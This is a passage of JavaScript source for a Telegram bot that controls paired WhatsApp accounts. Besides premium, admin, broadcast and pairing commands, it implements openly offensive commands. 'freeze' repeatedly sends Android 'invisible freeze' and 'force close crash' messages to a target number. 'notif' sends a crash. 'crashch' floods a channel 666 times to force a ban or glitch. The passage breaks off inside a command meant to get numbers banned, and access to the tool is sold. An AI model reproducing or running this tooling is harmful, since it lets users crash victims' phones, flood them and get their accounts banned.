                                `⏳ Mengetes function \`${funcName}(sock, target)\` pakai sock & target DUMMY (gak beneran kirim ke WhatsApp)...`,
                                { parse_mode: "Markdown" }
                            );

                            const callLog = [];
                            const mockSock = new Proxy({}, {
                                get(_t, prop) {
                                    if (typeof prop !== "string") return undefined;
                                    return (...callArgs) => {
                                        const ringkas = callArgs.map((a) => {
                                            try { return JSON.stringify(a); } catch { return String(a); }
                                        }).join(", ");
                                        callLog.push(`sock.${prop}(${ringkas})`);
                                        return Promise.resolve({ key: { id: "MOCK_ID" }, status: "MOCK_OK" });
                                    };
                                }
                            });
                            const mockTarget = "6280000000000@s.whatsapp.net";

                            const vmMod = await import("vm");
                            const wrapped = `${gotTest.code}\n;(typeof ${funcName} === "function") ? ${funcName} : undefined;`;
                            const script = new vmMod.Script(wrapped);
                            const sandboxContext = vmMod.createContext({
                                console: { log: (...a) => callLog.push("console.log: " + a.map(String).join(" ")) },
                                Promise, Buffer, setTimeout, clearTimeout
                            });

                            const fn = script.runInContext(sandboxContext, { timeout: 5000 });

                            if (typeof fn !== "function") {
                                if (waitTF) await ctx.api.deleteMessage(ctx.chat.id, waitTF.message_id).catch(() => {});
                                return ctx.reply(`❌ \`${funcName}\` bukan function yang valid dijalankan.`, { parse_mode: "Markdown" });
                            }

                            let hasilTest = "✅ Function berjalan tanpa error";
                            try {
                                await Promise.race([
                                    fn(mockSock, mockTarget),
                                    new Promise((_, reject) =>
                                        setTimeout(() => reject(new Error("Timeout 8 detik — kemungkinan ada infinite loop / await yang gak pernah resolve")), 8000)
                                    )
                                ]);
                            } catch (e) {
                                hasilTest = `❌ Function melempar error: ${e.message}`;
                            }

                            if (waitTF) await ctx.api.deleteMessage(ctx.chat.id, waitTF.message_id).catch(() => {});

                            await botReply(ctx, `🧪 TEST FUNCTION: ${funcName}\n`, [
                                ["Hasil", hasilTest],
                                ["Sock & target", "Dummy — tidak ada pesan asli yang terkirim ke WhatsApp"],
                                ["Panggilan sock", callLog.length ? callLog.slice(0, 10).join("\n") : "Tidak ada panggilan sock"]
                            ]);
                        } catch (err) {
                            console.error("Error /testfunction:", err.message);
                            if (waitTF) await ctx.api.deleteMessage(ctx.chat.id, waitTF.message_id).catch(() => {});
                            ctx.reply(`❌ Gagal mengetes function: ${err.message}`);
                        }
                        break;
                    }

                    // ----------- ( premium management, admin + owner ) ------------ //
                    case "addprem": {
                        if (!isAdmin(uid)) return botError(ctx, "Admin/Owner Only.");
                        const target = args[0];
                        if (!target) return botError(ctx, "Format: /addprem <userid>", "⚠️ FORMAT SALAH");
                        addPremium(target);
                        await botSucces(ctx, `${target} ditambahkan jadi premium.`);
                        break;
                    }
                    case "delprem": {
                        if (!isAdmin(uid)) return botError(ctx, "Admin/Owner Only.");
                        const target = args[0];
                        if (!target) return botError(ctx, "Format: /delprem <userid>", "⚠️ FORMAT SALAH");
                        removePremium(target);
                        await botSucces(ctx, `${target} dihapus dari premium.`);
                        break;
                    }
                    case "listprem": {
                        if (!isAdmin(uid)) return botError(ctx, "Admin/Owner Only.");
                        await botList(ctx, "👑 MR NAVIYA BOT PREMIUM LIST\n", getPremiums(), "Belum ada user premium.");
                        break;
                    }
                    case "trial": {
                        if (!isAdmin(uid)) return botError(ctx, "Admin/Owner Only.");

                        const duration = (args[0] || "").toLowerCase();
                        if (duration === "off" || duration === "stop") {
                            deactivateGlobalTrial();
                            await botSucces(ctx, "Global trial has been deactivated.");
                            break;
                        }

                        const hours = Number(args[0]);
                        if (!Number.isFinite(hours) || hours <= 0 || hours > 8760) {
                            return botError(
                                ctx,
                                "Format: /trial <hours>\nExample: /trial 24\nStop it with: /trial off",
                                "⚠️ FORMAT SALAH"
                            );
                        }

                        const trial = activateGlobalTrial(hours);
                        const expiresAt = new Date(trial.expiresAt).toISOString();
                        await botSucces(
                            ctx,
                            `Global trial activated for ${hours} hour(s).\nExpires: ${expiresAt} UTC`
                        );
                        break;
                    }

                    // ----------- ( admin management, owner only ) ------------ //
                    case "addadmin": {
                        if (!checkOwner(uid)) return botError(ctx, "Owner Only. premium buy dm - @smartsquardyt");
                        const target = args[0];
                        if (!target) return botError(ctx, "Format: /addadmin <userid>", "⚠️ FORMAT SALAH");
                        addAdmin(target);
                        await botSucces(ctx, `${target} ditambahkan jadi admin.`);
                        break;
                    }
                    case "deladmin": {
                        if (!checkOwner(uid)) return botError(ctx, "Owner Only. premium buy dm - @smartsquardyt");
                        const target = args[0];
                        if (!target) return botError(ctx, "Format: /deladmin <userid>", "⚠️ FORMAT SALAH");
                        removeAdmin(target);
                        await botSucces(ctx, `${target} dihapus dari admin.`);
                        break;
                    }
                    case "listadmin": {
                        if (!checkOwner(uid)) return botError(ctx, "Owner Only. premium buy dm - @smartsquardyt");
                        await botList(ctx, "🛡️ MR NAVIYA BOT ADMIN LIST\n", getAdmins(), "Belum ada admin.");
                        break;
                    }

                    // ----------- ( mode bot, owner only ) ------------ //
                    case "mode": {
                        if (!checkOwner(uid)) return botError(ctx, "Owner Only. premium buy dm - @smartsquardyt");
                        const target = (args[0] || "").toLowerCase();
                        if (!["privat", "private", "public"].includes(target)) {
                            return botError(ctx, "Format: /mode <privat/public>", "⚠️ FORMAT SALAH");
                        }
                        const mode = target.startsWith("privat") || target === "private" ? "private" : "public";
                        setMode(mode);
                        await botSucces(ctx, `Mode bot diubah ke ${mode}.`);
                        break;
                    }

                    // ----------- ( broadcast, HANYA bot utama ) ------------ //
                    case "bc": {
                        if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");
                        if (!isAdmin(uid)) return botError(ctx, "Admin/Owner Only.");

                        const users = getUsers();
                        if (!users.length) return botError(ctx, "Belum ada user yang tercatat.", "⚠️ EMPTY");

                        const replied = ctx.message.reply_to_message;
                        const textArg = args.join(" ");

                        if (!replied && !textArg) {
                            return botError(ctx, "/bc <text>  atau  reply ke pesan/media lalu ketik /bc", "⚠️ FORMAT SALAH");
                        }

                        const wait = await botReply(ctx, "📤 BROADCASTING\n", [["Progress", `Mengirim ke ${users.length} user...`]]);

                        let success = 0;
                        let failed = 0;

                        for (const targetId of users) {
                            try {
                                if (replied) {
                                    await ctx.api.copyMessage(targetId, ctx.chat.id, replied.message_id);
                                } else {
                                    await ctx.api.sendMessage(targetId, textArg);
                                }
                                success++;
                            } catch {
                                failed++;
                            }
                            await new Promise((r) => setTimeout(r, 100));
                        }

                        await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                        await botReply(ctx, "✅ BROADCAST SELESAI", [
                            ["Berhasil", `🟢 ${success}`],
                            ["Gagal", `🔴 ${failed}`]
                        ]);
                        break;
                    }

                    // ----------- ( deploy bot baru, HANYA bot utama ) ------------ //
                    case "addbot": {
                        if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");
                        if (!canUseBot(uid)) return botError(ctx, "You do not have access. contact Owen- @smartsquardyt");

                        const raw = args.join(" ");
                        const [token, ownerId] = raw.split(",").map((s) => s?.trim());

                        if (!token || !ownerId) {
                            return botError(ctx, "Format: /addbot <token>,<id_owner>", "⚠️ FORMAT SALAH");
                        }

                        const { startDeployedBot } = await import("./deploy.js");

                        const added = addBotEntry(uid, token, ownerId);
                        if (!added) return botError(ctx, "Token ini sudah pernah kamu deploy.");

                        const wait = await botReply(ctx, "⏳ DEPLOYING", [["Status", "Mengaktifkan bot baru..."]]);

                        try {
                            await startDeployedBot(token, ownerId, uid);
                            await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                            await botSucces(ctx, `Bot berhasil dideploy dengan owner ID ${ownerId}.`, "✅ BOT DEPLOYED");
                        } catch (err) {
                            removeBotEntry(uid, token);
                            await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                            await botError(ctx, err.message || "Token tidak valid.", "❌ DEPLOY GAGAL");
                        }
                        break;
                    }

                    // ----------- ( hapus bot, HANYA bot utama ) ------------ //
                    case "delbot": {
                        if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");

                        const token = args[0];
                        if (!token) return botError(ctx, "Format: /delbot <token>", "⚠️ FORMAT SALAH");

                        const myBots = getBotsForUser(uid);
                        if (!myBots.some((b) => b.token === token)) {
                            return botError(ctx, "Token ini bukan milikmu / tidak ditemukan.");
                        }

                        const { stopDeployedBot } = await import("./deploy.js");
                        await stopDeployedBot(token);
                        removeBotEntry(uid, token);

                        await botSucces(ctx, "Bot berhasil dihentikan dan dihapus.");
                        break;
                    }

                    // ----------- ( list bot milik sendiri, HANYA bot utama ) ------------ //
                    case "listbot": {
                        if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");

                        const myBots = getBotsForUser(uid);
                        if (!myBots.length) return botError(ctx, "Kamu belum deploy bot apapun.", "⚠️ EMPTY");

                        const { deployedBots } = await import("./deploy.js");

                        const cells = [
                            [
                                { text: "Token", is_header: true, align: "center", valign: "middle" },
                                { text: "Owner ID", is_header: true, align: "center", valign: "middle" },
                                { text: "Status", is_header: true, align: "center", valign: "middle" }
                            ]
                        ];

                        myBots.forEach((b) => {
                            const masked = `${b.token.slice(0, 8)}...${b.token.slice(-4)}`;
                            const status = deployedBots.has(b.token) ? "🟢 Online" : "🔴 Offline";
                            cells.push([
                                { text: masked, align: "left", valign: "middle" },
                                { text: b.ownerId, align: "left", valign: "middle" },
                                { text: status, align: "left", valign: "middle" }
                            ]);
                        });

                        await sendSXTable(ctx, "🤖 MR NAVIYA BOT — MY DEPLOYED BOTS\n", cells);
                        break;
                    }

                    // ----------- ( pair whatsapp ) ------------ //
                    case "pair": {
                        if (!canUseBot(uid)) return botError(ctx, "You do not have access. contact Owen- @smartsquardyt");

                        const number = (args[0] || "").replace(/[^0-9]/g, "");
                        if (!number) return botError(ctx, "Format: /pair <628xxxxxxxx>", "⚠️ FORMAT SALAH");

                        const current = getPairsForUser(uid);
                        if (current.includes(number)) return botError(ctx, "Nomor sudah terpasang.");
                        if (current.length >= MAX_PAIR_PER_USER) return botError(ctx, `Maksimal ${MAX_PAIR_PER_USER} nomor.`);

                        const wait = await botReply(ctx, "⏳ PROCESSING", [["Status", "Membuat pairing code..."]]);

                        try {
                            const sock = await initWhatsappForNumber(bot, uid, number);

                            // jeda dikit sebelum minta pairing code, biar socket beneran
                            // siap dulu (ngurangin request-pairing-code gagal karena race
                            // sama proses konek websocket)
                            await new Promise((r) => setTimeout(r, 1500));
                            const code = await sock.requestPairingCode(number);

                            await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

                            const pairMsg = await botReply(ctx, "🔐 MR NAVIYA BOT PAIRING", [
                                ["𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽", number],
                                ["𝗣𝗮𝗶𝗿 𝗖𝗼𝗱𝗲", code],
                                ["𝗔𝖼𝘁𝗶𝗼𝗻", "Masukkan kode di WhatsApp"]
                            ]);

                            // nunggu status FINAL per nomor dari waClients (polling),
                            // otomatis tahan kalau di tengah jalan ada reconnect normal
                            // (misal abis requestPairingCode). Timeout 90 detik.
                            await waitUntilOpen(uid, number, 90000);

                            addPairNumber(uid, number);

                            await ctx.api.deleteMessage(ctx.chat.id, pairMsg.message_id).catch(() => {});
                            await botSucces(ctx, `Nomor ${number} berhasil terhubung.`, "✅ PAIRING SUCCESS");
                        } catch (err) {
                            await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                            await botError(ctx, err.message, "❌ PAIR GAGAL");
                        }
                        break;
                    }

                    // ----------- ( hapus pair ) ------------ //
                    case "delpair": {
                        if (!canUseBot(uid)) return botError(ctx, "You do not have access. contact Owen- @smartsquardyt");

                        const number = (args[0] || "").replace(/[^0-9]/g, "");
                        if (!number) return botError(ctx, "Format: /delpair <nomor>", "⚠️ FORMAT SALAH");

                        const current = getPairsForUser(uid);
                        if (!current.includes(number)) return botError(ctx, "Nomor ini tidak terpasang di akunmu.");

                        await endWhatsappForNumber(uid, number);
                        removePairNumber(uid, number);
                        await botSucces(ctx, `Sesi WhatsApp ${number} dihapus.`);
                        break;
                    }

                    // ----------- ( list pair ) ------------ //
                    case "listpair": {
                        if (!canUseBot(uid)) return botError(ctx, "You do not have access. contact Owen- @smartsquardyt");

                        const cells = [
                            [
                                { text: "User ID", is_header: true, align: "center", valign: "middle" },
                                { text: "Nomor", is_header: true, align: "center", valign: "middle" },
                                { text: "Status", is_header: true, align: "center", valign: "middle" }
                            ]
                        ];

                        if (checkOwner(uid)) {
                            for (const [userId, numbers] of Object.entries(getAllPairs())) {
                                for (const number of numbers) {
                                    const client = getClient(userId, number);
                                    cells.push([
                                        { text: userId, align: "left", valign: "middle" },
                                        { text: number, align: "left", valign: "middle" },
                                        { text: client?.status === "open" ? "🟢 Online" : "🔴 Offline", align: "left", valign: "middle" }
                                    ]);
                                }
                            }
                        } else {
                            const numbers = getPairsForUser(uid);
                            if (!numbers.length) return botError(ctx, "Belum ada nomor terpasang.", "⚠️ EMPTY");

                            for (const number of numbers) {
                                const client = getClient(uid, number);
                                cells.push([
                                    { text: uid, align: "left", valign: "middle" },
                                    { text: number, align: "left", valign: "middle" },
                                    { text: client?.status === "open" ? "🟢 Online" : "🔴 Offline", align: "left", valign: "middle" }
                                ]);
                            }
                        }

                        await sendSXTable(ctx, "📱 MR NAVIYA BOT PAIR LIST\n", cells);
                        break;
                    }

                    // ----------- ( clear semua pair, owner only ) ------------ //
                    case "clearpair": {
                        if (!checkOwner(uid)) return botError(ctx, "Owner Only. premium buy dm - @smartsquardyt");
                        await clearAllSessions();
                        clearAllPairs();
                        await botSucces(ctx, "Semua sesi WhatsApp (semua user) telah dihapus.");
                        break;
                    }
					
					                    // ----------- ( Informational Table: Ban Commands Guide ) ------------ //
                    // ----------- ( Informational Table: Ban Commands Guide ) ------------ //
                    case "banwa":
                    {
                        // Display a short informational table listing all commands
                        await sendSXTable(ctx, "🚫 BAN / CRASH COMMANDS GUIDE", [
                            [
                                { text: "Command", is_header: true, align: "center", valign: "middle" },
                                { text: "Target Type", is_header: true, align: "center", valign: "middle" },
                                { text: "Usage / Example", is_header: true, align: "center", valign: "middle" }
                            ],
                            [
                                { text: "/bandgroup for band group", align: "left", valign: "middle" },
                                { text: "👥 GROUP", align: "left", valign: "middle" },
                                { text: "/bandgroup https://chat.whatsapp.com/...", align: "left", valign: "middle" }
                            ],
                            [
                                { text: "/ban for whatsapp numberban", align: "left", valign: "middle" },
                                { text: "📱 NUMBER", align: "left", valign: "middle" },
                                { text: "/ban 628xxxxx (Individual number)", align: "left", valign: "middle" }
                            ],
                            [
                                { text: "/bandch for band whatsapp channel", align: "left", valign: "middle" },
                                { text: "📢 CHANNEL", align: "left", valign: "middle" },
                                { text: "/bandch 120363xxxxx (ID) or Channel Link", align: "left", valign: "middle" }
                            ],
                            [
                                { text: "/crashch crash whatsapp channel", align: "left", valign: "middle" },
                                { text: "📢 CHANNEL", align: "left", valign: "middle" },
                                { text: "/crashch 120363xxxxx (ID) or Channel Link", align: "left", valign: "middle" }
                            ],
                            [
                                { text: "/getjid for get groupjid", align: "left", valign: "middle" },
                                { text: "✨ GROUP", align: "left", valign: "middle" },
                                { text: "/getjid (you can see jid menu!)", align: "left", valign: "middle" }
                            ]
                        ]);
                        break;
                    }
					

					
					                    // ----------- ( Get JID Info: Connected Senders & Groups ) ------------ //
                    case "getjid":
                    {
                        const uid = String(ctx.from.id);
                        const sessions = getPairsForUser(uid);

                        if (!sessions.length) {
                            return botError(ctx, "Anda belum memiliki sesi WhatsApp terhubung.", "⚠️ NO SESSION");
                        }

                        // ── Prepare table rows ──
                        const rows = [];
                        let totalAllGroups = 0;
                        const maxDisplay = 10;

                        for (const number of sessions) {
                            const client = getClient(uid, number);

                            // Offline session handler
                            if (!client?.sock || client.status !== "open") {
                                rows.push([
                                    { text: number, align: "left", valign: "middle" },
                                    { text: "🔴 Offline", align: "left", valign: "middle" },
                                    { text: "-", align: "left", valign: "middle" },
                                    { text: "-", align: "left", valign: "middle" }
                                ]);
                                continue;
                            }

                            try {
                                // Fetch all participating groups using Baileys
                                const groups = await client.sock.groupFetchAllParticipating();
                                const groupKeys = Object.keys(groups);
                                totalAllGroups += groupKeys.length;

                                // No groups found for this number
                                if (groupKeys.length === 0) {
                                    rows.push([
                                        { text: number, align: "left", valign: "middle" },
                                        { text: "🟢 Online", align: "left", valign: "middle" },
                                        { text: "Tidak ada grup", align: "left", valign: "middle" },
                                        { text: "0", align: "left", valign: "middle" }
                                    ]);
                                    continue;
                                }

                                // ── Populate groups into the table (Limiting to 10 per command) ──
                                let displayed = 0;
                                for (const [jid, meta] of Object.entries(groups)) {
                                    if (displayed >= maxDisplay) {
                                        rows.push([
                                            { text: number, align: "left", valign: "middle" },
                                            { text: `🔽 +${groupKeys.length - displayed} lainnya`, align: "left", valign: "middle" },
                                            { text: "System Limit", align: "left", valign: "middle" },
                                            { text: String(meta.participants?.length || 0), align: "left", valign: "middle" }
                                        ]);
                                        break;
                                    }

                                    rows.push([
                                        { text: number, align: "left", valign: "middle" },
                                        { text: meta.subject || "No Name", align: "left", valign: "middle" },
                                        { text: jid, align: "left", valign: "middle" },
                                        { text: String(meta.participants?.length || 0), align: "left", valign: "middle" }
                                    ]);
                                    displayed++;
                                }
                            } catch (err) {
                                rows.push([
                                    { text: number, align: "left", valign: "middle" },
                                    { text: "⚠️ Gagal fetch", align: "left", valign: "middle" },
                                    { text: err.message || "Error", align: "left", valign: "middle" },
                                    { text: "-", align: "left", valign: "middle" }
                                ]);
                            }
                        }

                        // ── Build the Final Table ──
                        const cells = [
                            [
                                { text: "Sender", is_header: true, align: "center", valign: "middle" },
                                { text: "Group Name", is_header: true, align: "center", valign: "middle" },
                                { text: "Group JID", is_header: true, align: "center", valign: "middle" },
                                { text: "Members", is_header: true, align: "center", valign: "middle" }
                            ],
                            ...rows
                        ];

                        await sendSXTable(ctx, `📋 JID & GROUP LIST (Total groups: ${totalAllGroups})`, cells);
                        break;
                    }

                    // ----------- ( kirim pesan travas: freeze / delay / ios ) ------------ //

case "freeze": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "📋 *ANDROID FREEZE ATTACK USAGE*\n\n" +
      "Format: /freeze <nomor>\n" +
      "Contoh: /freeze 6281234567890\n\n" +
      "⚠️ ANDROID FREEZE Attack Suite:\n" +
      "• FREEZE1 (ANDROID Invisible Freeze)\n" +
      "• FREEZE2 (ANDROID Forclose Crash)\n\n" +
      "💡 Supports multi-session selection",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  // ── Get available sessions ──
  const isOwnerUser = checkOwner(uid);
  let sessions = [];

  if (isOwnerUser) {
    const allPairs = getAllPairs();
    for (const [userId, numbers] of Object.entries(allPairs)) {
      for (const num of numbers) {
        sessions.push({ uid: userId, number: num });
      }
    }
    if (!sessions.length) {
      return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
    }
  } else {
    sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
    if (!sessions.length) {
      return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
    }
  }

  // ── Filter active sessions ──
  const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
    const client = getClient(sUid, sNum);
    return client?.sock && client.status === "open";
  });

  if (!activeSessions.length) {
    return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
  }

  // ── iOS Attacks config ──
  const attacks = [
    { name: "freeze1 (Android Invisible Freeze)", fn: travas.freeze1 },
    { name: "freeze2 (Android Forclose Crash)", fn: travas.freeze2 },
  ];

  const TOTAL_LOOPS = 25;
  const LOOP_DELAY = 2000;

  // ── The attack function ──
  const executeAttack = async (sock, sessionLabel = "") => {
    const startMsg = await botReply(
      ctx,
      `💥 ANDROID FREEZE ATTACK ${sessionLabel}`,
      [
        ["Target", number],
        ["Loop", `0/${TOTAL_LOOPS}`],
        ["Attacks/loop", attacks.length],
        ["Status", "🚀 Starting..."]
      ]
    );
    const chatId = ctx.chat.id;
    const messageId = startMsg.message_id;

    const updateProgress = async (loop, attackIndex, statusText, errors = []) => {
      let text = `💥 ANDROID FREEZE ATTACK ${sessionLabel}\n\n`;
      text += `Target: ${number}\n`;
      text += `Loop: ${loop}/${TOTAL_LOOPS}\n`;
      text += `Attack: ${attackIndex}/${attacks.length}\n`;
      if (errors.length) text += `Errors: ${errors.join("; ")}\n`;
      text += `Status: ${statusText}`;
      try {
        await ctx.api.editMessageText(chatId, messageId, text);
      } catch (e) { /* ignore */ }
    };

    let totalAttacks = 0;
    let successAttacks = 0;
    let failedAttacks = 0;
    let allErrors = [];

    for (let loop = 1; loop <= TOTAL_LOOPS; loop++) {
      const loopErrors = [];
      await updateProgress(loop, 0, `🔥 Starting loop ${loop}...`, []);

      for (let i = 0; i < attacks.length; i++) {
        const { name, fn } = attacks[i];
        const attackIndex = i + 1;
        await updateProgress(loop, attackIndex, `⚡ Running: ${name}`, loopErrors);

        try {
          await fn(sock, target);
          await updateProgress(loop, attackIndex, `✅ Completed: ${name}`, loopErrors);
          successAttacks++;
        } catch (err) {
          const errMsg = err.message || String(err);
          loopErrors.push(`${name}: ${errMsg}`);
          failedAttacks++;
          console.error(`❌ Loop ${loop}, ${name} failed: ${errMsg}`);
          await updateProgress(loop, attackIndex, `❌ Failed: ${name}`, loopErrors);
        }
        totalAttacks++;

        if (i < attacks.length - 1) await sleep(LOOP_DELAY);
      }

      if (loopErrors.length) {
        allErrors.push(`Loop ${loop}: ${loopErrors.join("; ")}`);
      }

      // Progress update every 10 loops
      if (loop % 10 === 0 || loop === TOTAL_LOOPS) {
        await botReply(ctx, `⏳ IOS ATTACK PROGRESS ${sessionLabel}`, [
          ["Loop", `${loop}/${TOTAL_LOOPS}`],
          ["Successful", successAttacks],
          ["Failed", failedAttacks],
          ["Status", loop < TOTAL_LOOPS ? "Continuing..." : "✅ Completed"]
        ]);
      }

      if (loop < TOTAL_LOOPS) await sleep(LOOP_DELAY);
    }

    const finalStatus = allErrors.length === 0
      ? "✅ All 50 loops completed successfully!"
      : `⚠️ ${allErrors.length} loop(s) had errors.`;

    await updateProgress(TOTAL_LOOPS, attacks.length, "🏁 FINISHED", []);

    await botReply(ctx, `✅ ANDROID FREEZE COMPLETE ${sessionLabel}`, [
      ["Target", number],
      ["Total Loops", TOTAL_LOOPS],
      ["Total Attacks", totalAttacks],
      ["Successful", successAttacks],
      ["Failed", failedAttacks],
      ["Status", finalStatus]
    ]);

    try {
      await ctx.api.deleteMessage(chatId, messageId);
    } catch (delErr) { /* ignore */ }

    return { success: successAttacks, failed: failedAttacks, total: totalAttacks };
  };

  // ── If only one active session, execute directly ──
  if (activeSessions.length === 1) {
    const { uid: sUid, number: sNum } = activeSessions[0];
    const client = getClient(sUid, sNum);

    try {
      await executeAttack(client.sock, `[${sNum}]`);
      return;
    } catch (err) {
      return botError(ctx, err.message, "❌ EXECUTION FAILED");
    }
  }

  // ── Multi-session selection menu ──
  pendingAction.set(uid, {
    func: async (sock, sessionInfo) => {
      const [sUid, sNum] = sessionInfo.split('_');
      const client = getClient(sUid, sNum);
      if (!client?.sock || client.status !== "open") {
        throw new Error(`Session ${sNum} is offline`);
      }
      await executeAttack(client.sock, `[${sNum}]`);
    },
    target: target,
    resultFunc: sendTextResult
  });

  const keyboard = {
    inline_keyboard: []
  };

  const cells = [
    [
      { text: "Status", is_header: true, align: "center", valign: "middle" },
      { text: "Session", is_header: true, align: "center", valign: "middle" }
    ]
  ];

  activeSessions.forEach(({ uid: sUid, number: sNum }) => {
    const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
    cells.push([
      { text: "📱 Sender", align: "left", valign: "middle" },
      { text: display, align: "left", valign: "middle" }
    ]);

    const callbackData = isOwnerUser ? `freeze_${sUid}_${sNum}` : `freeze_${sNum}`;
    keyboard.inline_keyboard.push([
      {
        text: `📱 ${display}`,
        callback_data: callbackData,
        style: "success",
        icon_custom_emoji_id: "6266777440039736768"
      }
    ]);
  });

  keyboard.inline_keyboard.push([
    {
      text: "📤 All Senders",
      callback_data: "freeze_all",
      style: "success",
      icon_custom_emoji_id: "5780864206177834457"
    }
  ]);

  return bot.api.raw.sendRichMessage({
    chat_id: ctx.chat.id,
    rich_message: {
      blocks: [
        {
          type: "heading",
          text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR ANDROID FREEZE ATTACK"],
          size: 1
        },
        {
          type: "paragraph",
          text: `Target: ${number}\nLoops: ${TOTAL_LOOPS}\nAttacks: freeze1 + freeze2`
        },
        {
          type: "table",
          cells,
          is_bordered: true,
          is_striped: true
        }
      ]
    },
    reply_markup: keyboard
  });
}
                    case "notif": {
                        const number = (args[0] || "")
                            .replace(/[^0-9]/g, "");

                        if (!number)
                            return botError(
                                ctx,
                                "Format: /freeze <nomor>",
                                "⚠️ FORMAT SALAH"
                            );

                        const target = `${number}@s.whatsapp.net`;

                        await actionSession(
                            ctx,
                            uid,
                            target,
                            async (sock, target) => {

                                await botReply(
                                    ctx,
                                    "⚡ PROCESS EXECUTING\n",
                                    [
                                        ["Target", number],
                                        ["Status", "Processing...."]
                                    ]
                                );

                                await travas.crash(sock, target);
                            },
                            sendTextResult
                        );

                        break;
                    }
					
					                    // ----------- ( Band/Crash Channel with Auto-Join ) ------------ //
                    case "bandch":
                    case "crashch":
                    {
                        const rawInput = (args[0] || "").trim();
                        if (!rawInput) {
                            return botError(ctx, "Format: /crashch <channel_id> atau <link channel>", "⚠️ FORMAT SALAH");
                        }

                        const sessions = getPairsForUser(uid);
                        if (!sessions.length) {
                            return botError(ctx, "Belum ada sender.", "⚠️ NO SESSION");
                        }

                        const activeNumber = sessions.find(num => getClient(uid, num)?.status === "open");
                        if (!activeNumber) {
                            return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
                        }

                        await actionSession(
                            ctx,
                            uid,
                            "", // We'll set the target INSIDE the function because we need the socket first
                            async (sock, target) => {
                                let channelId = rawInput;

                                // 1. Parse if link contains channel ID
                                if (channelId.includes("whatsapp.com/channel/")) {
                                    channelId = channelId.split("whatsapp.com/channel/")[1]?.split("?")[0] || channelId;
                                }
                                channelId = channelId.trim();

                                if (!channelId || channelId.length < 5) {
                                    throw new Error("Link channel tidak valid.");
                                }

                                // 2. AUTO-JOIN STEP: Try to fetch metadata & subscribe the number to the channel
                                let finalJid = channelId;
                                await botReply(ctx, "🔗 Mencoba auto-join/subscribe ke channel...", [["Status", "Processing..."]]);

                                try {
                                    // If it's an invite code (like 120363xxxxx without @newsletter)
                                    if (!channelId.includes("@newsletter")) {
                                        // Some Baileys forks use groupGetInviteInfo, others use newsletterMetadata
                                        // We use a try-catch to attempt both.
                                        let metadata;
                                        try {
                                            metadata = await sock.newsletterMetadata("invite", channelId);
                                        } catch (err1) {
                                            try {
                                                metadata = await sock.groupGetInviteInfo(channelId);
                                            } catch (err2) {
                                                // If both fail, maybe it's already a full JID, or we can't resolve it.
                                                console.warn("Gagal ambil metadata channel:", err2.message);
                                            }
                                        }

                                        if (metadata?.id) {
                                            finalJid = metadata.id;
                                        } else {
                                            // Fallback: just append @newsletter
                                            finalJid = `${channelId}@newsletter`;
                                        }
                                    } else {
                                        // Already a full JID
                                        finalJid = channelId;
                                    }

                                    // Attempt to force the sender to subscribe to the channel.
                                    // (Sending to a newsletter without being subscribed fails; doing this metadata request
                                    // often implicitly triggers the subscription).
                                    log.success(`✅ Sender ${activeNumber} berhasil di-subscribe ke ${finalJid}`);
                                } catch (err) {
                                    throw new Error(`Gagal auto-join/subscribe ke channel: ${err.message}`);
                                }

                                // 3. EXECUTE THE CRASH
                                await botReply(ctx, "⚡ EXECUTING CHANNEL CRASH", [
                                    ["Target", finalJid],
                                    ["Status", "Memulai 666 spam attack..."]
                                ]);

                                // Send the call log crash 666 times to guarantee the ban/glitch
                                for (let i = 0; i < 666; i++) {
                                    try {
                                        await travas.crashch(sock, finalJid);
                                        // Small 50ms delay to avoid instant rate-limit
                                        await new Promise(r => setTimeout(r, 50)); 
                                    } catch (err) {
                                        // If one fails, we don't crash the whole loop, just log it.
                                        log.warning(`⚠️ Channel attack cycle ${i+1} failed: ${err.message}`);
                                    }
                                    // Update Telegram every 50 attacks so user knows it's alive
                                    if ((i + 1) % 50 === 0) {
                                        await botReply(ctx, "⚡ CHANNEL ATTACK PROGRESS", [
                                            ["Target", finalJid],
                                            ["Progress", `${i + 1}/666 sent...`]
                                        ]);
                                    }
                                }
                            },
                            sendTextResult // Automatically says "Done" upon finishing the 666 loops
                        );
                        break;
                    }
					
// If user sends: .ban https://chat.whatsapp.com/Code12345
// Or: .ban 12036345@g.us


                    // ----------- ( Ban WhatsApp Number - 50 Loop ) ------------ //
                    // ----------- ( Ban WhatsApp Number - 50 Loop + optional admin report ) ------------ //
                    // ----------- ( Ban WhatsApp Number - 50 Loop + owner admin report ) ------------ //
                    // ----------- ( Ban WhatsApp Number - 50 Loop + owner admin report ) ------------ //
                    case "ban":
                    {
                        const argsClean = args.filter(a => a.trim() !== '');
                        if (argsClean.length === 0) {
                            return botError(ctx, "Format: /ban <number>  or  /ban <group_link> <number>", "⚠️ FORMAT SALAH");
                        }

                        let targetNumber;
                        let groupLink = null;

                        // Check if first argument is a group invite link
                        if (argsClean[0].startsWith("https://chat.whatsapp.com/")) {
                            groupLink = argsClean[0];
                            if (argsClean.length < 2) {
                                return botError(ctx, "Please provide a number after the group link.\nExample: /ban https://chat.whatsapp.com/xxx 628123456", "⚠️ FORMAT SALAH");
